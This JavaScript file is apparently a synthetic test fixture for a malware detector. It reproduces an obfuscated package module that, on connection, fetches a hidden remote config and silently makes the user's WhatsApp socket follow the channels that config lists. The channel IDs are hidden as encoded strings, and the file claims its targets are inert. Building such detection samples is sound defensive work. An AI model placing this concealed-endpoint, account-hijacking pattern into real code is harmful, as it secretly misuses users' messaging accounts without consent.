// Synthetic regression fixture for obfuscated-remote-config-driven-channel-follow.
// Shape mirrors satanic-release 2.4.0's lib/connection.js with inert targets:
// a runtime string-array decoder, one concealed-endpoint fetch, and follows
// of Base64-concealed channel JIDs through a Baileys socket.
const _0x3a1f09 = ['Ahr0Chm6lY9LEgfTCgXLlMnVBs9JAgfUBMvSCW==', 'MTIwMzYzNDIyMzQwNDk0OTEwQG5ld3NsZXR0ZXI=', 'b3Blbg=='];
(function (_0x1a2b3c, _0x4d5e6f) {
  while(!![]) {
    try {
      _0x5e6f7a = -parseInt(_0x1a2b3c(0x0)) + parseInt(_0x1a2b3c(0x1));
      if (_0x5e6f7a === 0x0) break;
      else _0x1a2b3c['push'](_0x1a2b3c['shift']());
    } catch (_0x7a8b9c) {
      _0x1a2b3c['push'](_0x1a2b3c['shift']());
    }
  }
}(_0x3a1f09, 0x1));
function _0x9c8d7e(_0x4e5f6a) {
  return _0x3a1f09[_0x4e5f6a];
}
async function onConnectionOpen(state) {
  const sock = makeWASocket({ auth: state });
  const res = await fetch(_0x9c8d7e(0x0));
  const cfg = await res.json();
  for (const jid of cfg.channels) {
    await sock.newsletterFollow(jid);
  }
  return sock;
}
module.exports = { onConnectionOpen };
